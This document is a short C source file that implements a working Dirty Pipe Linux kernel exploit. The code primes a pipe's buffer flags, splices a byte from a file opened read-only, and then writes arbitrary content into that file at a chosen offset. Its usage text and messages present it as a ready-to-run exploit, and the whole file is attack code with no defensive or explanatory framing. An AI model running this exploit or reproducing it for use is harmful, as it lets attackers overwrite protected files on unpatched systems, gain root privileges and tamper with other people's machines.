#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

size_t page_size;

void err_exit(char *msg) {
  puts(msg);
  exit(EXIT_FAILURE);
}

static void prepare_pipe(int p[2]) {
  if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);  // get size of pipe_bufs
	static char buffer[4096];

  // fill pipe buffer
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

  // set pipe->flags = PIPE_BUF_FLAG_CAN_MERGE
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}
}

int main(int argc, char **argv) {
  if (argc != 4) {
    err_exit("[x] usage: ./dirtypipe_writefile <filename> <offset> <content>");
  }

  puts("[*] start exploit");
  puts("[+] get page size");
  page_size = sysconf(_SC_PAGE_SIZE);


  puts("[+] get and check args");
  const char *filename = argv[1];
  __off64_t offset = strtoul(argv[2], NULL, 0);
  const char *content = argv[3];
  const size_t data_size = strlen(content);
  
  // open file but read only !!! XD 
  int fd = open(filename, O_RDONLY);
  if (fd < 0) {
    err_exit("[x] cannot open file");
  }
  struct stat st;
  if (fstat(fd, &st)) {
    err_exit("[x] get stat error");
  }

  if (offset % page_size == 0) {
    err_exit("[x] cannot start writing at a page boundary");
  }

  if (offset > st.st_size) {
    err_exit("[x] offset large than file size");
  }
  
  if (offset + data_size > st.st_size) {
    err_exit("[x] write error! large then original file size");
  }

  puts("[+] prepare pipe");
  int pipe_fd[2];
  prepare_pipe(pipe_fd);

  puts("[+] splice file");

  --offset;    // why do this? => write from 0->offset-1 to pipe, then we can change from offset 
  ssize_t nbytes = splice(fd, &offset, pipe_fd[1], NULL, 1, 0);  // write offset byte from file to pipe
  if (nbytes < 0) {
    err_exit("[x] splice error");
  }

  puts("[+] write content to target file");
  nbytes = write(pipe_fd[1], content, data_size);
  if (nbytes <= 0 || nbytes < data_size) {
    err_exit("[x] write to file error");
  }
  puts("[*] finish exploit!!");
  close(fd);
  return 0;
}